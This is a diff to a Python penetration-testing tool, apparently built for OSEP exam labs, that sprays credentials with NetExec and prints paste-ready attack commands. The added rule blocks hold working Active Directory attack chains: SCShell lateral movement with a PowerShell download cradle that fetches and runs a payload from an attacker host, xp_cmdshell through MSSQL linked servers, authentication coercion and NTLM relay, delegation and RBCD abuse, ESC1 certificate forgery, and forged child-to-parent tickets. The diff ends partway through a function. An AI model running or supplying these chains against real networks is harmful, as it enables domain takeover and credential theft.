@@ -23,6 +23,7 @@ Architecture (single file on purpose — easy to scp onto a box mid-exam):
 # MIT License — see LICENSE block at end of file.
 
 import argparse
+import base64
 import ipaddress
 import json
 import os
@@ -33,6 +34,7 @@ import signal
 import socket
 import subprocess
 import sys
+import tempfile
 import threading
 import time
 from concurrent.futures import ThreadPoolExecutor, as_completed
@@ -59,6 +61,12 @@ def configure_colors(no_color: bool) -> None:
 
 # ─── Protocol config ───────────────────────────────────────────────────
 ALL_PROTOCOLS = ["smb", "ssh", "ldap", "ftp", "wmi", "winrm", "rdp", "vnc", "mssql", "nfs"]
+# Sprayed when --protocols isn't given. VNC and NFS are excluded: nxc's vnc
+# module is password-only (it ignores the -u we pass) and its nfs module
+# doesn't do credentialed auth at all, so every credential against them
+# produced an error line and burned a 45s process slot for nothing. Both are
+# still selectable explicitly with --protocols.
+DEFAULT_PROTOCOLS = [p for p in ALL_PROTOCOLS if p not in ("vnc", "nfs")]
 LOCAL_AUTH_PROTOCOLS = {"smb", "wmi", "winrm", "rdp", "mssql"}
 
 # Default TCP port per protocol for the pre-flight probe.
@@ -115,6 +123,7 @@ class Config:
     domain: str = ""                        # -d: explicit AD domain for nxc
     force: bool = False                     # bypass the spawn-budget guard
     max_attempts: int = DEFAULT_MAX_ATTEMPTS
+    sh_only: bool = False                   # --sh: paste-ready commands only
 
 
 @dataclass(frozen=True)
@@ -165,6 +174,13 @@ class Success:
 @dataclass
 class TargetResult:
     target: str
+    # What we actually hand to nxc. Normally == target, but a Kerberos run
+    # needs an SPN-resolvable NAME, so this may be rewritten to the host's
+    # FQDN (see TomSploit._resolve_kerberos_target).
+    nxc_target: str = ""
+    # False when --no-port-probe skipped the pre-flight: open_protocols is
+    # then an assumption, not evidence, and must not be used as a signal.
+    probed: bool = True
     real_ip: str = ""
     hostname: str = ""
     domain: str = ""        # AD domain from nxc info line (e.g. "DANTE.local")
@@ -224,6 +240,30 @@ def parse_nxc_line(line: str) -> tuple[str | None, str]:
     return None, line.strip()
 
 
+def _split_principal(head: str) -> tuple[str, str]:
+    """Split a `DOMAIN\\user` / `user@REALM` / `user` head into (domain, user)."""
+    head = head.strip()
+    if "\\" in head:
+        domain, user = head.split("\\", 1)
+        return domain.strip(), user.strip()
+    if "@" in head:
+        # user@REALM — the realm is Kerberos's, not a Windows domain prefix,
+        # but it identifies the same principal.
+        user, realm = head.split("@", 1)
+        return realm.strip(), user.strip()
+    return "", head
+
+
+def _principal_matches(head: str, user: str) -> bool:
+    """True if an nxc success head names the account we actually tried."""
+    _dom, name = _split_principal(head)
+    want = (user or "").strip()
+    if "\\" in want:
+        want = want.split("\\", 1)[1]
+    want = want.split("@", 1)[0]
+    return bool(name) and bool(want) and name.lower() == want.lower()
+
+
 def parse_success_message(msg: str) -> tuple[str, str, str, bool, bool]:
     """Parse an nxc [+] message into (domain, user, secret, is_admin, is_guest).
 
@@ -233,6 +273,13 @@ def parse_success_message(msg: str) -> tuple[str, str, str, bool, bool]:
         DANTE-NIX02\\admin:admin (Guest)            -> (...,False,True)
         WORKGROUP\\j:aad3b...:31d6cfe0... (Pwn3d!)   -> (...,True,False)
         admin:Password123                           -> ('','admin','Password123',False,False)
+
+    Secretless (Kerberos / ticket-cache) successes carry no `:secret` at all:
+        DANTE.local\\katwamba from ccache (Pwn3d!)  -> (...,'',True,False)
+        DANTE.local\\katwamba                       -> (...,'',False,False)
+    Those used to fall into a branch that returned the ENTIRE remaining
+    string as the username ("katwamba from ccache"), so parse the leading
+    principal token instead.
     """
     cleaned = msg.strip()
     is_admin = False
@@ -248,29 +295,39 @@ def parse_success_message(msg: str) -> tuple[str, str, str, bool, bool]:
             is_admin = True
         cleaned = cleaned[:m.start()].rstrip()
 
-    if not cleaned or ":" not in cleaned:
-        return "", cleaned, "", is_admin, is_guest
+    if not cleaned:
+        return "", "", "", is_admin, is_guest
+
+    if ":" not in cleaned:
+        # Secretless success — only the leading token is the principal;
+        # anything after it ("from ccache") is prose.
+        domain, user = _split_principal(cleaned.split()[0])
+        return domain, user, "", is_admin, is_guest
 
     head, secret = cleaned.split(":", 1)
-    if "\\" in head:
-        domain, user = head.split("\\", 1)
-    else:
-        domain, user = "", head
-    return domain.strip(), user.strip(), secret, is_admin, is_guest
+    domain, user = _split_principal(head)
+    return domain, user, secret, is_admin, is_guest
 
 
-def is_auth_success(msg: str, user: str) -> bool:
+def is_auth_success(msg: str, user: str, allow_secretless: bool = False) -> bool:
     """True only if a [+] line really is a credential success for `user`.
 
-    nxc's auth-success format is `DOMAIN\\user:secret [ (flag) ]`. Modules
-    and status messages also use [+] (e.g. "[+] Dumped 5 objects"); without
-    this guard those would be mis-parsed into bogus Success objects."""
+    nxc's password/hash auth-success format is `DOMAIN\\user:secret [ (flag) ]`.
+    Modules and status messages also use [+] (e.g. "[+] Dumped 5 objects");
+    without this guard those would be mis-parsed into bogus Success objects.
+
+    `allow_secretless` relaxes the colon requirement and is set ONLY for
+    Kerberos attempts, where the ticket cache is the credential and nxc
+    prints `DOMAIN\\user [from ccache]` with no secret to match on. Keeping
+    it opt-in means an ordinary module line like "[+] Dumped 5 objects" still
+    can't sneak through on a password run."""
     cleaned = re.sub(r"\s*\([^()]*\)\s*$", "", msg.strip())
-    if ":" not in cleaned:
+    if ":" in cleaned:
+        return _principal_matches(cleaned.split(":", 1)[0], user)
+    if not allow_secretless:
         return False
-    head = cleaned.split(":", 1)[0]
-    name = head.split("\\", 1)[1] if "\\" in head else head
-    return name.strip().lower() == (user or "").strip().lower()
+    parts = cleaned.split()
+    return bool(parts) and _principal_matches(parts[0], user)
 
 
 # Markers that an nxc [+] line is auth-related even when it doesn't parse as
@@ -317,6 +374,14 @@ def extract_ipv4(text: str) -> str | None:
 # these with a [-] marker, so without this they'd all look alike.
 _ORDINARY_FAIL_RE = re.compile(
     r"STATUS_LOGON_FAILURE|STATUS_ACCESS_DENIED|"
+    # Kerberos equivalents of "wrong password" / "no such user". Without
+    # these every failed -k attempt fell through to 'error' and printed in
+    # red, so a routine Kerberos spray looked like the tool was broken.
+    r"KDC_ERR_PREAUTH_FAILED|KDC_ERR_C_PRINCIPAL_UNKNOWN|"
+    r"KDC_ERR_PRINCIPAL_NOT_FOUND|"
+    # The service answered but won't do this auth for this account — noise,
+    # not a fault (e.g. RDP without NLA, a protocol that won't take a hash).
+    r"STATUS_NOT_SUPPORTED|STATUS_PIPE_NOT_AVAILABLE|"
     r"authentication failed|login failed|invalid credentials",
     re.IGNORECASE)
 _VALID_BUT_RE = re.compile(  # creds are actually CORRECT, with a caveat
@@ -326,7 +391,9 @@ _VALID_BUT_RE = re.compile(  # creds are actually CORRECT, with a caveat
 _ALERT_FAIL_RE = re.compile(  # stop-and-look failures
     r"STATUS_ACCOUNT_LOCKED_OUT|STATUS_ACCOUNT_DISABLED|"
     r"STATUS_ACCOUNT_RESTRICTION|STATUS_LOGON_TYPE_NOT_GRANTED|"
-    r"STATUS_NOLOGON|STATUS_INVALID_LOGON_HOURS",
+    r"STATUS_NOLOGON|STATUS_INVALID_LOGON_HOURS|"
+    # Kerberos: account disabled, locked, or expired — same tactic change.
+    r"KDC_ERR_CLIENT_REVOKED|KDC_ERR_CLIENT_EXPIRED",
     re.IGNORECASE)
 
 
@@ -445,7 +512,12 @@ def extract_smb_signing(target_info: str) -> bool | None:
 # against SUGGEST_RULES. Every value substituted into a template passes
 # through shlex.quote() first, so secrets with spaces/quotes/$ paste safely.
 #
-# Rationale for what is / isn't suggested (OSCP-flavoured):
+# Rationale for what is / isn't suggested (OSEP / PEN-300 oriented):
+#   * The tool's job ends at "valid credential + the next command"; it is an
+#     enumeration and credential-triage aid, NOT an exploitation framework.
+#     Payload generation, AV/AMSI/AppLocker bypass and process injection are
+#     deliberately out of scope (that is TomCrypt's job) — so what you get
+#     here is the AD legwork that surrounds those, not the delivery itself.
 #   * One share enumerator (nxc --shares already shows r/w perms) to avoid
 #     the smbmap-vs-nxc duplication.
 #   * `--rid-brute` is offered everywhere it works — it pulls users over
@@ -541,8 +613,8 @@ SUGGEST_RULES: list[SuggestRule] = [
             "--dns-server {qip}"),
         ("attack-path checks",
             "nxc ldap {qip} -u {quser} -p {qpw} --password-not-required\n"
-            "nxc ldap {qip} -u {quser} -p {qpw} --trusted-for-delegation\n"
-            "nxc ldap {qip} -u {quser} -p {qpw} --admin-count"),
+            "nxc ldap {qip} -u {quser} -p {qpw} --admin-count\n"
+            "# (delegation enumeration is in the delegation block below)"),
         ("offline AD dump (no BloodHound)",
             "ldapdomaindump -u {ldap_user} -p {qpw} {qip}"),
         ("enumerate more usernames (kerbrute)",
@@ -569,7 +641,7 @@ SUGGEST_RULES: list[SuggestRule] = [
     )),
     SuggestRule(AuthType.PASSWORD, "rdp", commands=(
         ("RDP session (+ share mount for transfers)",
-            "xfreerdp3 /u:{quser} /p:{qpw} /d:{qdom} /v:{qip} "
+            "{rdp_bin} /u:{quser} /p:{qpw} /d:{qdom} /v:{qip} "
             "/dynamic-resolution /drive:share,/home/kali /cert:ignore"),
         ("screenshot the desktop",
             "nxc rdp {qip} -u {quser} -p {qpw} --screenshot"),
@@ -591,8 +663,14 @@ SUGGEST_RULES: list[SuggestRule] = [
             "ssh -o UserKnownHostsFile=/dev/null "
             "-o StrictHostKeyChecking=no {user_ssh}"),
         ("after login — quick local enum",
-            "sudo -l\nid\nls -la /home /opt /var/www 2>/dev/null\n"
-            "# then upload + run linpeas for the full pass"),
+            "sudo -l\nid\nls -la /home /opt /var/www 2>/dev/null"),
+    )),
+    SuggestRule(AuthType.KERBEROS, "ssh", commands=(
+        ("shell via the ticket cache (GSSAPI)",
+            "ssh -o GSSAPIAuthentication=yes -o PreferredAuthentications="
+            "gssapi-with-mic -K {quser}@{ip}"),
+        ("after login — quick local enum",
+            "sudo -l\nid\nls -la /home /opt /var/www 2>/dev/null"),
     )),
     SuggestRule(AuthType.PASSWORD, "ftp", commands=(
         ("interactive (active mode)",
@@ -610,9 +688,7 @@ SUGGEST_RULES: list[SuggestRule] = [
         ("mount an export",
             "sudo mkdir -p /mnt/nfs && sudo mount -t nfs -o nolock,vers=3 "
             "{ip}:<EXPORT> /mnt/nfs"),
-        ("no_root_squash priv-esc note",
-            "# if the export allows root write, drop a SUID-root binary "
-            "on it and execute it on the target"),
+
     )),
 
     # ── SCShell — admin-gated, DC or not ────────────────────────────
@@ -630,31 +706,31 @@ SUGGEST_RULES: list[SuggestRule] = [
     SuggestRule(AuthType.PASSWORD, "smb", admin=True, commands=(
         ("lateral movement via SCShell — use when psexec/smbexec fail",
             "python3 SCShell.py {url_pw} -service-name ssh-agent\n"
-            "# alt services known to work: defragsvc\n"
-            "# Reconfigures an EXISTING service's binPath — no ADMIN$ file write.\n"
-            "# Still needs 445: the SCM is reached over \\pipe\\svcctl.\n"
-            "# Logs 7040 (service config changed), not 7045 (new service installed).\n"
-            "# SCShell> takes a FULL-path command (no output returned), e.g. a cradle:\n"
+            "# if ssh-agent is absent, confirm a present service first:\n"
+            "sc.exe query state= all | findstr SERVICE_NAME   # (in any shell you land)\n"
+            "# swap -service-name to one of: defragsvc seclogon SensorDataService SessionEnv\n"
+
+            "# SCShell> full-path command, e.g.:\n"
             "#   C:\\Windows\\System32\\cmd.exe /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n"
             "#     -ep bypass iex(New-Object Net.WebClient).DownloadString('http://$LHOST/payload.ps1')"),
     )),
     SuggestRule(AuthType.HASH, "smb", admin=True, commands=(
         ("lateral movement via SCShell [PtH] — use when psexec/smbexec fail",
             "python3 SCShell.py {url_nopw} -hashes :{nthash} -service-name ssh-agent\n"
-            "# alt services known to work: defragsvc\n"
-            "# Reconfigures an EXISTING service's binPath — no ADMIN$ file write.\n"
-            "# Still needs 445: the SCM is reached over \\pipe\\svcctl.\n"
-            "# Logs 7040 (service config changed), not 7045 (new service installed).\n"
-            "# SCShell> takes a FULL-path command, e.g. a cradle:\n"
+            "# if ssh-agent is absent, confirm a present service first:\n"
+            "sc.exe query state= all | findstr SERVICE_NAME   # (in any shell you land)\n"
+            "# swap -service-name to one of: defragsvc seclogon SensorDataService SessionEnv\n"
+
+            "# SCShell> full-path command, e.g.:\n"
             "#   C:\\Windows\\System32\\cmd.exe /c C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n"
             "#     -ep bypass iex(New-Object Net.WebClient).DownloadString('http://$LHOST/payload.ps1')"),
     )),
     SuggestRule(AuthType.KERBEROS, "smb", admin=True, commands=(
         ("lateral movement via SCShell -k — use when psexec fails",
             "python3 SCShell.py -k -no-pass {url_nopw} -service-name ssh-agent\n"
-            "# alt services known to work: defragsvc\n"
-            "# Reconfigures an EXISTING service's binPath — no ADMIN$ file write.\n"
-            "# Still needs 445: the SCM is reached over \\pipe\\svcctl."),
+            "# if ssh-agent is absent, confirm a present service first:\n"
+            "sc.exe query state= all | findstr SERVICE_NAME\n"
+            "# swap -service-name to: defragsvc seclogon SensorDataService SessionEnv"),
     )),
 
     # ── HASH (Pass-the-Hash) ────────────────────────────────────────
@@ -701,7 +777,7 @@ SUGGEST_RULES: list[SuggestRule] = [
     )),
     SuggestRule(AuthType.HASH, "rdp", commands=(
         ("RDP session [PtH]",
-            "xfreerdp3 /u:{quser} /pth:{qhash} /d:{qdom} /v:{qip} "
+            "{rdp_bin} /u:{quser} /pth:{qhash} /d:{qdom} /v:{qip} "
             "/dynamic-resolution /drive:share,/home/kali /cert:ignore"),
         ("screenshot the desktop [PtH]",
             "nxc rdp {qip} -u {quser} -H {qhash} --screenshot"),
@@ -733,8 +809,8 @@ SUGGEST_RULES: list[SuggestRule] = [
             "--dns-server {qip}"),
         ("attack-path checks [PtH]",
             "nxc ldap {qip} -u {quser} -H {qhash} --password-not-required\n"
-            "nxc ldap {qip} -u {quser} -H {qhash} --trusted-for-delegation\n"
-            "nxc ldap {qip} -u {quser} -H {qhash} --admin-count"),
+            "nxc ldap {qip} -u {quser} -H {qhash} --admin-count\n"
+            "# (delegation enumeration is in the delegation block below)"),
     )),
     SuggestRule(AuthType.HASH, "ldap", dc=False, commands=(
         ("request a TGT (then use with -k)",
@@ -768,6 +844,181 @@ SUGGEST_RULES: list[SuggestRule] = [
         ("BloodHound fallback (nxc collector) -k",
             "nxc ldap {qip} -u {quser} -k --bloodhound -c All "
             "--dns-server {qip}"),
+    )),
+
+    # ══ OSEP / PEN-300 lateral-movement follow-ups ═════════════════
+    # The blocks above get a shell and dump the box — the foundational core.
+    # The ones below are the lateral-movement continuations that an
+    # enumeration hit can tee up: host posture (what AV/EDR is watching),
+    # linked-server pivots, the four flavours of delegation, authentication
+    # coercion for relay, AD CS (ESC1/ESC8), domain/forest trusts, and the
+    # cross-domain hop. All standard nxc / impacket / certipy invocations.
+    # Placeholders in <ANGLE BRACKETS> are yours to fill from the enumeration
+    # output, and in --sh mode any line still holding one is emitted
+    # commented-out so the script stays runnable. These recipes stop where a
+    # payload or an interactive relay listener takes over — that hand-off is
+    # deliberate.
+
+    # ── Host posture: what's defending this box ─────────────────────
+    SuggestRule(AuthType.PASSWORD, "smb", commands=(
+        ("AV / EDR present on the host (read this BEFORE delivering anything)",
+            "nxc smb {qip} -u {quser} -p {qpw} -M enum_av"),
+    )),
+    SuggestRule(AuthType.HASH, "smb", commands=(
+        ("AV / EDR present on the host [PtH]",
+            "nxc smb {qip} -u {quser} -H {qhash} -M enum_av"),
+    )),
+
+    # ── MSSQL: privileges and linked servers ────────────────────────
+    # A linked server is the classic OSEP pivot: the link executes under a
+    # DIFFERENT login (often sa, often on a different host), so a low-priv
+    # SQL account on box A becomes command execution on box B.
+    SuggestRule(AuthType.PASSWORD, "mssql", commands=(
+        ("SQL privileges + impersonable logins",
+            "nxc mssql {qip} -u {quser} -p {qpw} -M mssql_priv\n"
+            "nxc mssql {qip} -u {quser} -p {qpw} -M enum_impersonate\n"
+            "nxc mssql {qip} -u {quser} -p {qpw} -M enum_logins\n"
+            "# escalate once a sysadmin impersonation path is confirmed:\n"
+            "nxc mssql {qip} -u {quser} -p {qpw} -M mssql_priv -o ACTION=privesc"),
+        ("linked servers — enumerate the chain",
+            "nxc mssql {qip} -u {quser} -p {qpw} -M enum_links\n"
+            "# or interactively:\n"
+            "impacket-mssqlclient {url_pw} {mssql_authflag}\n"
+            "#   enum_links          -- list links + the login each runs as\n"
+            "#   use_link [SRV]      -- switch execution onto a link\n"
+            "#   SELECT SYSTEM_USER; -- confirm who you became"),
+        ("execute down a linked server (needs RPC Out on the link)",
+            "# from the mssqlclient prompt, once a link is confirmed:\n"
+            "EXEC ('SELECT @@version, SYSTEM_USER') AT [<LINKED-SRV>];\n"
+            "# enable xp_cmdshell on the far end:\n"
+            "EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [<LINKED-SRV>];\n"
+            "EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [<LINKED-SRV>];\n"
+            "EXEC ('xp_cmdshell ''whoami''') AT [<LINKED-SRV>];\n"
+            "# chained links nest the same way:\n"
+            "#   EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [<SRV2>]') AT [<SRV1>];"),
+        ("same thing via nxc modules (no SQL prompt needed)",
+            "nxc mssql {qip} -u {quser} -p {qpw} -M link_enable_cmdshell "
+            "-o LINKED_SERVER=<SRV>\n"
+            "nxc mssql {qip} -u {quser} -p {qpw} -M link_xpcmd "
+            "-o LINKED_SERVER=<SRV> CMD='whoami'"),
+    )),
+    SuggestRule(AuthType.HASH, "mssql", commands=(
+        ("SQL privileges + linked servers [PtH]",
+            "nxc mssql {qip} -u {quser} -H {qhash} -M mssql_priv\n"
+            "nxc mssql {qip} -u {quser} -H {qhash} -M enum_impersonate\n"
+            "nxc mssql {qip} -u {quser} -H {qhash} -M enum_links"),
+    )),
+
+    # ── LDAP/DC: delegation, coercion, trusts, LAPS, ADCS ───────────
+    SuggestRule(AuthType.PASSWORD, "ldap", dc=True, commands=(
+        ("delegation — find every abusable account first",
+            "nxc ldap {qip} -u {quser} -p {qpw} --find-delegation\n"
+            "impacket-findDelegation {qdom}/{quser}:{qpw} -dc-ip {qip}\n"
+            "# read the TYPE column: it decides which of the next three you use"),
+        ("unconstrained delegation — capture a DC TGT via coercion",
+            "# if findDelegation shows a host you control as Unconstrained:\n"
+            "# 1. start the catcher on Kali:\n"
+            "#    impacket-krbrelayx -t {dom_plain} --hashes :<host-nthash>   # (dumps TGTs)\n"
+            "# 2. coerce the DC to auth to that host (see the coercion recipe below)\n"
+            "# 3. resubmit the captured DC$ TGT:\n"
+            "#    export KRB5CCNAME=DC01\\$@{dom_plain}.ccache\n"
+            "#    impacket-secretsdump -k -no-pass <dc.fqdn> -just-dc"),
+        ("constrained delegation — impersonate via S4U (protocol transition)",
+            "# findDelegation shows msDS-AllowedToDelegateTo on the account:\n"
+            "impacket-getST -spn <cifs/target.fqdn> -impersonate administrator \\\n"
+            "  {qdom}/<DELEG-ACCOUNT>:<PASSWORD> -dc-ip {qip}\n"
+            "# SPN is not checked in the ticket — swap service with -altservice\n"
+            "# (e.g. -altservice host/target.fqdn or ldap/dc.fqdn for DCSync):\n"
+            "export KRB5CCNAME=administrator@<spn>.ccache\n"
+            "impacket-psexec -k -no-pass {dom_plain}/administrator@<target.fqdn>"),
+        ("RBCD — when you have GenericWrite/GenericAll over a computer",
+            "# needs write on the target's msDS-AllowedToActOnBehalfOfOtherIdentity\n"
+            "# (BloodHound flags this as the edge). MAQ must be >0 for addcomputer:\n"
+            "impacket-addcomputer {qdom}/{quser}:{qpw} -dc-ip {qip} \\\n"
+            "  -computer-name 'TOMPC$' -computer-pass 'Passw0rd!'\n"
+            "impacket-rbcd -delegate-to '<TARGET$>' -delegate-from 'TOMPC$' \\\n"
+            "  -action write {qdom}/{quser}:{qpw} -dc-ip {qip}\n"
+            "impacket-getST -spn cifs/<target.fqdn> -impersonate administrator \\\n"
+            "  {qdom}/'TOMPC$':'Passw0rd!' -dc-ip {qip}"),
+        ("coercion — force a target to authenticate (relay / unconstrained trigger)",
+            "# check which methods bite (LISTENER defaults to localhost = safe probe):\n"
+            "nxc smb {qip} -u {quser} -p {qpw} -M coerce_plus\n"
+            "# then fire at your listener (relay catcher or krbrelayx):\n"
+            "nxc smb {qip} -u {quser} -p {qpw} -M coerce_plus -o LISTENER=$LHOST\n"
+            "# relay elsewhere (SMB signing off) or to AD CS HTTP (ESC8):\n"
+            "# impacket-ntlmrelayx -t smb://<victim> -smb2support\n"
+            "# impacket-ntlmrelayx -t http://<ca>/certsrv/certfnsh.asp --adcs --template DomainController"),
+        ("domain / forest trusts",
+            "nxc ldap {qip} -u {quser} -p {qpw} --dc-list\n"
+            "impacket-lookupsid {url_pw} 0\n"
+            "# ^ --dc-list enumerates trusts; lookupsid gives the domain SID you\n"
+            "#   need for a cross-domain golden/forged ticket"),
+        ("LAPS / gMSA passwords (if this account can read them)",
+            "nxc ldap {qip} -u {quser} -p {qpw} -M laps\n"
+            "nxc ldap {qip} -u {quser} -p {qpw} --gmsa"),
+        ("AD CS — find vulnerable templates, then request as a target",
+            "nxc ldap {qip} -u {quser} -p {qpw} -M adcs\n"
+            "certipy find -u {quser}@{dom_plain} -p {qpw} -dc-ip {ip} "
+            "-vulnerable -stdout\n"
+            "# ESC1 (template allows SAN): request as Administrator, then PKINIT:\n"
+            "certipy req -u {quser}@{dom_plain} -p {qpw} -dc-ip {ip} \\\n"
+            "  -ca <CA-NAME> -template <TEMPLATE> -upn administrator@{dom_plain}\n"
+            "certipy auth -pfx administrator.pfx -dc-ip {ip}\n"
+            "# ^ returns the NT hash (UnPAC-the-hash) + a usable TGT"),
+    )),
+    SuggestRule(AuthType.HASH, "ldap", dc=True, commands=(
+        ("delegation — find every abusable account first [PtH]",
+            "nxc ldap {qip} -u {quser} -H {qhash} --find-delegation\n"
+            "impacket-findDelegation {qdom}/{quser} -hashes :{nthash} -dc-ip {qip}"),
+        ("constrained delegation — impersonate via S4U [PtH]",
+            "impacket-getST -spn <cifs/target.fqdn> -impersonate administrator \\\n"
+            "  {qdom}/<DELEG-ACCOUNT> -hashes :<deleg-nthash> -dc-ip {qip}\n"
+            "# swap service freely with -altservice (SPN isn't checked)\n"
+            "export KRB5CCNAME=administrator@<spn>.ccache\n"
+            "impacket-psexec -k -no-pass {dom_plain}/administrator@<target.fqdn>"),
+        ("RBCD [PtH]",
+            "impacket-addcomputer {qdom}/{quser} -hashes :{nthash} -dc-ip {qip} \\\n"
+            "  -computer-name 'TOMPC$' -computer-pass 'Passw0rd!'\n"
+            "impacket-rbcd -delegate-to '<TARGET$>' -delegate-from 'TOMPC$' \\\n"
+            "  -action write {qdom}/{quser} -hashes :{nthash} -dc-ip {qip}\n"
+            "impacket-getST -spn cifs/<target.fqdn> -impersonate administrator \\\n"
+            "  {qdom}/'TOMPC$':'Passw0rd!' -dc-ip {qip}"),
+        ("coercion — force auth for relay / unconstrained [PtH]",
+            "nxc smb {qip} -u {quser} -H {qhash} -M coerce_plus\n"
+            "nxc smb {qip} -u {quser} -H {qhash} -M coerce_plus -o LISTENER=$LHOST"),
+        ("domain / forest trusts [PtH]",
+            "nxc ldap {qip} -u {quser} -H {qhash} --dc-list\n"
+            "impacket-lookupsid {url_nopw} -hashes :{nthash} 0"),
+        ("LAPS / gMSA passwords [PtH]",
+            "nxc ldap {qip} -u {quser} -H {qhash} -M laps\n"
+            "nxc ldap {qip} -u {quser} -H {qhash} --gmsa"),
+        ("AD CS — find vulnerable templates [PtH]",
+            "nxc ldap {qip} -u {quser} -H {qhash} -M adcs\n"
+            "certipy find -u {quser}@{dom_plain} -hashes :{nthash} -dc-ip {ip} "
+            "-vulnerable -stdout\n"
+            "certipy req -u {quser}@{dom_plain} -hashes :{nthash} -dc-ip {ip} \\\n"
+            "  -ca <CA-NAME> -template <TEMPLATE> -upn administrator@{dom_plain}\n"
+            "certipy auth -pfx administrator.pfx -dc-ip {ip}"),
+    )),
+
+    # ── After DCSync: the cross-domain continuation ─────────────────
+    # DCSync gets you one domain. In a multi-domain forest the krbtgt hash of
+    # a CHILD domain forges a ticket into the PARENT via the SID-history
+    # field (Enterprise Admins, -519) — the forest-level escalation PEN-300
+    # builds toward. This fires only on a confirmed DC admin, since you need
+    # krbtgt in hand for it to mean anything.
+    SuggestRule(AuthType.PASSWORD, "smb", dc=True, admin=True, commands=(
+        ("child → parent escalation (after you have krbtgt)",
+            "# 1. child domain SID:\n"
+            "impacket-lookupsid {url_pw} 0\n"
+            "# 2. parent domain SID (same command against the parent DC), then\n"
+            "#    forge with Enterprise Admins (-519) from the PARENT:\n"
+            "impacket-ticketer -nthash <KRBTGT-NT-HASH> -domain-sid <CHILD-SID> \\\n"
+            "  -domain {dom_plain} -extra-sid <PARENT-SID>-519 Administrator\n"
+            "export KRB5CCNAME=Administrator.ccache\n"
+            "impacket-psexec -k -no-pass <parent-dc.fqdn>\n"
+            "# nxc automates the same chain:\n"
+            "#   nxc ldap {qip} -u {quser} -p {qpw} -M raisechild"),
     )),
 ]
 
@@ -824,7 +1075,24 @@ def build_context(s: Success, ip: str, hostname: str, is_dc: bool,
         "ftp_url": q(f"ftp://{user}:{secret}@{ip}/"),
         "dom_plain": domain or "<DOMAIN>",
         "mssql_authflag": "" if s.local_auth else "-windows-auth",
+        # Kali 2024+ ships xfreerdp3; older images only have xfreerdp. Pick
+        # whichever is actually on PATH so a pasted command doesn't die with
+        # "command not found" at the worst possible moment.
+        "rdp_bin": rdp_binary(),
     }
+
+
+def rdp_binary() -> str:
+    """Name of the FreeRDP client present on this box (cached)."""
+    global _RDP_BIN
+    if _RDP_BIN is None:
+        _RDP_BIN = ("xfreerdp3" if shutil.which("xfreerdp3")
+                    else "xfreerdp" if shutil.which("xfreerdp")
+                    else "xfreerdp3")
+    return _RDP_BIN
+
+
+_RDP_BIN: str | None = None
 
 
 def _inject_local_auth(cmd: str) -> str:
@@ -891,7 +1159,10 @@ class Reporter:
 
     def __init__(self, cfg: Config):
         self.cfg = cfg
-        self.quiet = cfg.quiet
+        self.sh = cfg.sh_only
+        # --sh is quiet plus a different renderer: every quiet short-circuit
+        # in this class is one we also want in script mode.
+        self.quiet = cfg.quiet or cfg.sh_only
         self.verbose = cfg.verbose
         self.multi = len(cfg.targets) > 1
 
@@ -900,8 +1171,12 @@ class Reporter:
         if self.quiet:
             return
         cfg = self.cfg
-        proto_label = ("all" if len(cfg.protocols) == len(ALL_PROTOCOLS)
-                       else ",".join(cfg.protocols))
+        if cfg.protocols == list(ALL_PROTOCOLS):
+            proto_label = "all"
+        elif cfg.protocols == list(DEFAULT_PROTOCOLS):
+            proto_label = "default (all except vnc,nfs)"
+        else:
+            proto_label = ",".join(cfg.protocols)
         n_creds = self._cred_count()
         total = n_creds * tasks_per_target(cfg) * len(cfg.targets)
         print(f"\n{BOLD}{'═' * BANNER_WIDTH}{RESET}")
@@ -912,12 +1187,16 @@ class Reporter:
               f"Protocols {DIM}│{RESET} {BOLD}{proto_label}{RESET}")
         print(f"  Users           {DIM}│{RESET} {BOLD}{len(cfg.users):<11}{RESET} "
               f"Workers   {DIM}│{RESET} {BOLD}{cfg.workers}{RESET}")
-        if cfg.paired:
+        if cfg.kerberos:
+            # "0p / 0h" reads like nothing is loaded, when in fact the ticket
+            # cache IS the credential — one attempt per user.
+            cred_label = "ccache"
+        elif cfg.paired:
             np = sum(1 for p in cfg.passwords if p)
             nh = sum(1 for h in cfg.hashes if h)
+            cred_label = f"{np}p / {nh}h"
         else:
-            np, nh = len(cfg.passwords), len(cfg.hashes)
-        cred_label = f"{np}p / {nh}h"
+            cred_label = f"{len(cfg.passwords)}p / {len(cfg.hashes)}h"
         print(f"  Credentials     {DIM}│{RESET} {BOLD}{cred_label:<11}{RESET} "
               f"Timeout   {DIM}│{RESET} {BOLD}{NETEXEC_TIMEOUT}s{RESET}/attempt")
         if cfg.paired:
@@ -944,9 +1223,15 @@ class Reporter:
         return len(cfg.users) * (len(cfg.passwords) + len(cfg.hashes))
 
     def target_header(self, target: str) -> None:
+        if self.sh:
+            print(f"\n# ═══ {target} ═══")
+            return
         print(f"  {GREEN}{BOLD}► {target}{RESET}")
 
     def no_open_ports(self) -> None:
+        if self.sh:
+            print("# no open ports — skipped")
+            return
         print(f"    {RED}✘ No open ports — skipping.{RESET}\n")
 
     def port_probe(self, result: TargetResult) -> None:
@@ -1009,6 +1294,9 @@ class Reporter:
         return f"{RED}✘{RESET}"
 
     def protocol_results(self, result: TargetResult) -> None:
+        # Script mode: stdout is a shell script, so no prose at all.
+        if self.sh:
+            return
         # Quiet: skip the whole box, but never swallow an alarm.
         if self.quiet:
             self._quiet_alarms(result)
@@ -1157,7 +1445,105 @@ class Reporter:
                   f"{YELLOW}{tag}{RESET}")
 
     # ── valid-credentials section (the headline) ─
+    # ── --sh: paste-ready commands, nothing else ─
+    _PLACEHOLDER_RE = re.compile(r"<[^<>\s][^<>]*>")
+
+    @classmethod
+    def _sh_command(cls, cmd: str) -> list[str]:
+        """Render one suggestion's lines for --sh, commenting out any command
+        that still holds an unfilled <PLACEHOLDER>.
+
+        Placeholders aren't merely non-runnable: to a shell '<' and '>' are
+        REDIRECTS, so `-extra-sid <PARENT-SID>-519` would quietly create a
+        file called '-519', and a trailing `<parent-dc.fqdn>` is a syntax
+        error that aborts everything after it in a sourced script.
+
+        Works on whole LOGICAL commands rather than physical lines, because a
+        backslash continuation is one command and half-commenting it is worse
+        than not commenting at all: comment only the second line and the
+        first dangles with a trailing '\\' that splices the comment into it;
+        comment only the first and the second runs as an orphan fragment
+        (`-action write ...`). Fill the value in, strip the leading '# ',
+        then run."""
+        lines = cmd.split("\n")
+        out: list[str] = []
+        i = 0
